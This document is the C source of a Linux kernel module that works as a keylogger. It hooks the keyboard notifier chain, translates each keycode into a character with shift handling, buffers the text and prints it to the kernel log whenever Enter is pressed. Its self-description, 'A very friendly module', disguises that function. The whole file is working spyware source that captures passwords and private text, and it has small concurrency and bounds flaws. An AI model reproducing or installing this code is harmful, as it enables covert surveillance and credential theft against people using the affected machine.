#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/semaphore.h>

#define DRIVER_AUTHOR "Tomasz Lipiec"
#define DRIVER_DESC   "A very friendly module"
#define DRIVER_LICENSE "GPL"

#define BUFFER 512

struct semaphore sem;

static const char* keymap[] = { "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "<BACKSPACE>", "<TAB>",
                        "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "<ENTER>", "<CTRL>", "a", "s", "d", "f",
                        "g", "h", "j", "k", "l", ";", "'", "`", "<SHIFT>", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".",
                        "/", "<SHIFT>", "\0", "\0", " ", "<CAPSLOCK>", "<F1>", "<F2>", "<F3>", "<F4>", "<F5>", "<F6>", "<F7>",
                        "<F8>", "<F9>", "<F10>", "<NUMLOCK>", "<SCROLLLOCK>", "<HOME>", "<UP>", "<PGUP>", "-", "<LEFT>", "5",
                        "<RTARROW>", "+", "<END>", "<DOWN>", "<PGDN>", "<INS>", "<DEL>", "\0", "\0", "\0", "<F11>", "<F12>",
                        "\0", "\0", "\0", "\0", "\0", "\0", "\0", "<ENTER>", "CTRL>", "/", "<PRTSCR>", "ALT", "\0", "<HOME>",
                        "<UP>", "<PGUP>", "<LEFT>", "<RIGHT>", "<END>", "<DOWN>", "<PGDN>", "<INSERT>", "<DEL>", "\0", "\0",
                        "\0", "\0", "\0", "\0", "\0", "<PAUSE>"};

static const char* keymapShiftActivated[] =
                        { "\0", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+", "<BACKSPACE>", "<TAB>",
                        "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "{", "}", "<ENTER>", "<CTRL>", "A", "S", "D", "F",
                        "G", "H", "J", "K", "L", ":", "\"", "~", "<SHIFT>", "|", "Z", "X", "C", "V", "B", "N", "M", "<", ">",
                        "?", "<SHIFT>", "\0", "\0", " ", "<CAPSLOCK>", "<F1>", "<F2>", "<F3>", "<F4>", "<F5>", "<F6>", "<F7>",
                        "<F8>", "<F9>", "<F10>", "<NUMLOCK>", "<SCROLLLOCK>", "<HOME>", "<UP>", "<PGUP>", "-", "<LEFT>", "5",
                        "<RTARROW>", "+", "<END>", "<DOWN>", "<PGDN>", "<INS>", "<DEL>", "\0", "\0", "\0", "<F11>", "<F12>",
                        "\0", "\0", "\0", "\0", "\0", "\0", "\0", "<ENTER>", "CTRL>", "/", "<PRTSCR>", "ALT", "\0", "<HOME>",
                        "<UP>", "<PGUP>", "<LEFT>", "<RIGHT>", "<END>", "<DOWN>", "<PGDN>", "<INSERT>", "<DEL>", "\0", "\0",
                        "\0", "\0", "\0", "\0", "\0", "<PAUSE>"};

static int shiftKeyDepressed = 0;

char keylogged[BUFFER];

int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param)
{
    struct keyboard_notifier_param *param = _param;
    if (code == KBD_KEYCODE)
    {
        if( param->value==42 || param->value==54 )
        {
            //acquire lock to modify the global variable shiftKeyDepressed
            down(&sem);
            if(param->down)
                shiftKeyDepressed = 1;
            else
                shiftKeyDepressed = 0;
            up(&sem);
            return NOTIFY_OK;
        }

        if((param->down && param->value == 28) || keylogged[BUFFER-12] != 0)
        {
            //acquire lock to read the global variable shiftKeyDepressed
            down(&sem);
			printk(KERN_INFO "%s\n", keylogged);
			memset(keylogged, 0, BUFFER);
            up(&sem);
        }
		
		if(param->down && param->value != 28)
		{
		    down(&sem);
            if(shiftKeyDepressed == 0)
                strcat(keylogged, keymap[param->value]);
            else
                strcat(keylogged, keymapShiftActivated[param->value]);
            up(&sem);
		}
    }

    return NOTIFY_OK;
}

static struct notifier_block keylogger_nb =
{
    .notifier_call = keylogger_notify
};


static int __init init_keylogger(void)
{
    // Register this module with the notification list maintained by the keyboard driver.
    
    register_keyboard_notifier(&keylogger_nb);
    printk(KERN_INFO "Registering the keylogger module with the keyboard notifier list\n");
    sema_init(&sem, 1);
    return 0;
}

static void __exit cleanup_keylogger(void)
{
    unregister_keyboard_notifier(&keylogger_nb);
    printk(KERN_INFO "Unregistered the keylogger module \n");
}

module_init(init_keylogger);
module_exit(cleanup_keylogger);
MODULE_LICENSE(DRIVER_LICENSE);
MODULE_AUTHOR(DRIVER_AUTHOR);
MODULE_DESCRIPTION(DRIVER_DESC);
MODULE_SUPPORTED_DEVICE("Not machine dependent");
